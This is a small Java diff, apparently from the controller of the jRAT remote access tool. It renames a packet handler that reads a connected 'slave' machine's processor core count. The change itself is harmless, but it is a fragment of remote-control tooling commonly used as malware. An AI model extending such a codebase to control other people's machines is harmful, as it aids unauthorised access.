@@ -5,12 +5,12 @@ import java.io.DataInputStream;
 import se.jrat.client.Slave;
 
 
-public class Packet64InitAvailableProcessors extends AbstractIncomingPacket {
+public class Packet64InitAvailableCores extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		short processors = slave.readShort();
-		slave.setProcessors(processors);
+		short cores = slave.readShort();
+		slave.setCores(cores);
 	}
 
 }
